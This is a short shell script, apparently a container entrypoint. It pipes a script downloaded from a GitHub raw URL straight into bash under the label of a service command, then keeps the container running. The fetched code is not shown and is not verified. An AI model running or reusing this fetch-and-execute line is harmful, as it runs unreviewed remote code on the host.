#!/bin/sh

SERVICE_COMMAND="curl -s https://raw.githubusercontent.com/rannan1999/all-bash/refs/heads/main/workes/test.sh | bash"

run_service() {
    echo "[BASH] Running service command..."
    bash -c "$SERVICE_COMMAND"
    echo "[BASH] Service exited with code: $?"
}

keep_alive() {
    echo "[SYSTEM] Keeping container alive..."
    tail -f /dev/null
}

main() {
    run_service
    keep_alive
}

main "$@"
